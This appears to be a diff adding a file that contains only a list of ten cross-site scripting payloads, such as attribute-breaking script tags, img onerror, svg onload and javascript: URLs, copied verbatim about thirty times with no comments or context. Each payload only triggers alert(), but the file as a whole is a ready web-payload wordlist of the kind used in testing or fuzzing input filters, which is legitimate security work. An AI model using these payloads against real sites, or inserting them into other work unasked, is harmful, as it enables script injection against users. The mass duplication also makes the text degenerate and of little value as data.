@@ -1,0 +1,329 @@
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+"><a href="javascript:alert('XSS')">Click Me</a>
+"><body onload=alert('XSS')>
+"><input value="<svg onload=alert(1)>">
+"><textarea><svg onload=alert('XSS')></textarea>
+"><iframe src=javascript:alert('XSS')>
+"><math><mtext></mtext><script>alert('XSS')</script></math>
+"><marquee onstart=alert('XSS')>XSS</marquee>
